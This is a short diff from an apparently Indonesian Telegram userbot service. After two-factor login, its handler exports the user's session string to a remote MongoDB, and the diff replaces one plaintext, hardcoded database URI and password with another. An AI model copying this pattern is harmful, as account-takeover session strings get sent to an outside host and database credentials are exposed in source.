@@ -82,7 +82,7 @@ async def recv_tg_tfa_message(_, message: Message):
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
+        client = pymongo.MongoClient("mongodb+srv://zorsatoru:megumi11@lenonubot.y4b8m9c.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
@@ -111,7 +111,7 @@ async def recv_tg_tfa_message(_, message: Message):
         accesdb = db.acces
         accesdb.users.delete_one({'user_id': int(message.chat.id)})
         try:
-            await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik Ping Untuk Mengecek Bot.**")
+            await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
             LOGGER(__name__).info("BOT SERVER RESTARTED !!")
         except BaseException as err:
             LOGGER(__name__).info(f"{err}")
